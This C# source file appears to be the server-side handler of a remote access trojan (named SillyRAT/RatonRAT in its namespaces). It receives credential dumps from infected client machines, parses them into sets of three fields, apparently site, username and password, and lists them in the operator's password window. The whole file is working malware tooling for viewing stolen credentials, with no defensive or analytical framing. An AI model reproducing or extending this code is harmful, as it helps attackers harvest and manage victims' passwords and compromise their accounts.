using System;
using System.Drawing;
using System.Windows.Forms;
using SillyRAT;
using Server.Connection;
using RatonRAT.ClientForms;
using Stuff;

namespace Server.Handlers
{
    internal class HandlePasswords
    {
        public HandlePasswords(SillyClient SillyClient, Unpack unpack)
        {
            string formName = "Passwords | Client ID: ";
            FormPassword formPassword = (FormPassword)Application.OpenForms[formName + unpack.GetAsString("UID")];

            if (formPassword != null)
            {
                if (formPassword.SillyClient == null)
                {
                    formPassword.SillyClient = SillyClient;
                }

                formPassword.Invoke(new MethodInvoker(() =>
                {
                    string[] passwords = unpack.GetAsString("Passwords").Split(new[] { "-=>", "\n" }, StringSplitOptions.RemoveEmptyEntries);
                    formPassword.listView1.BeginUpdate();

                    int addedCount = 0;

                    for (int x = 0; x < passwords.Length; x += 3)
                    {
                        if (x + 2 < passwords.Length)
                        {
                            ListViewItem listViewItem = new ListViewItem(passwords[x]);
                            listViewItem.SubItems.Add(passwords[x + 1]);
                            listViewItem.SubItems.Add(passwords[x + 2]);
                            listViewItem.ImageIndex = 0;
                            formPassword.listView1.Items.Add(listViewItem);
                            addedCount++;
                        }
                        else
                        {
                            Program.form2.AddLog("Incomplete set of credentials, skipping...", Color.LimeGreen);
                        }
                    }

                    formPassword.listView1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.ColumnContent);
                    formPassword.listView1.EndUpdate();
                    formPassword.label2.Visible = false;
                    foreach (ColumnHeader column in formPassword.listView1.Columns)
                    {
                        column.Width = formPassword.listView1.Width / formPassword.listView1.Columns.Count;
                    }
                }));
            }
        }
    }
}
